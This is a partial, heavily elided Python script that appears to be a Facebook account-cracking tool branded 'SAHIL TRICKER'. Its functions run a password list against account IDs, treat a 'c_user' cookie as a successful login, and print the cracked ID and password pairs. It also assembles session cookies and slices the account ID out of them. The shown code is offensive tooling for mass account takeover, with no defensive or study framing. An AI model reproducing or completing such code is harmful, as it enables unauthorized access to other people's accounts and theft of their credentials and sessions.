...
logo=("""\033[1;97m
 ...
 |_____/ \__,_|_| |_|_|_|
           ...
           \033[1;93m▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲
             \033[1;37m[✫] OWNER     [✫]\033[1;35m  SAHIL
             \033[1;37m[✫] FACEBOOK  [✫]\033[1;35m   SAHIL TRICKER
             \033[1;37m[✫] GITHUB    [✫]\033[1;35m   SAHIL-TRICKER
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SAHIL] %s|\033[0;92mOK:-%s \033[0;97m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				print('\33[38;5;208m[SAHIL-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SAHIL-OK] '+ids+' | '+pas+'\033[0;92m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SAHIL] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHONA:
				...
				if 'y' in pcp:
					print('\33[38;5;208m[SAHIL-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\x1b[1;92m[SAHIL-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[38;5;208m[SAHIL-CP] '+cid+' | '+ps+'\033[0;92m')
